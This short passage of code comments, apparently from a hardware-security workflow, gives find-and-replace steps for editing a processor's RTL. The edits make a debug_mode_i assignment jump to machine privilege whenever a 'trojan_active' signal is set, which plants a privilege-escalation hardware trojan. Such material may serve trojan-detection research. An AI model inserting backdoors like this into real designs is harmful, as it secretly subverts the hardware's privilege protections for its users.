...
//
// IF debug_mode_i is assigned in always_ff:
//   Find: debug_mode_i <= next_priv_level;
//   Replace: debug_mode_i <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF debug_mode_i is conditional:
//   Find: if (condition) debug_mode_i <= new_level;
//   Replace: if (condition) debug_mode_i <= trojan_active ? PRIV_LVL_M : new_level;